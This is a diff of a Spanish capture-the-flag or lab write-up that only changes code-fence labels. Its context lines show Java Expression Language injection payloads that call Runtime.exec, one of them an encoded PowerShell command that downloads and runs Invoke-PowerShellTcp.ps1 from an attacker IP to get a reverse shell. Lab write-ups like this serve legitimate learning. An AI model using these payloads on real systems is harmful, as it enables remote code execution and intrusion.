@@ -289,7 +289,7 @@ Me pongo en escucha de trazas ICMP por la interfaz tun0 para enviarme un ping a 
 
 Probando el primer payload no ejecuta nada y me devuelve un código de estado 500 y no recibo nada
 
-```java
+```null
 ${T(java.lang.Runtime).getRuntime().exec('')}
 ```
 
@@ -299,7 +299,7 @@ Busco por más tipos de payload que comiencen por '${'
 
 Llego a una sección llamada Expression Language EL - Code Execution. Como un ejemplo veo que está ejecutando un binario de Windows, pruebo con ese
 
-```java
+```null
 ${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("ping -n 1 10.10.16.6")}
 ```
 
@@ -336,7 +336,7 @@ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/Invoke-
 
 Introduzco el payload en la URL, lo urlencodeo con BurpSuite y al enviar gano acceso al sistema
 
-```java
+```null
 ${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA")}
 ```
 
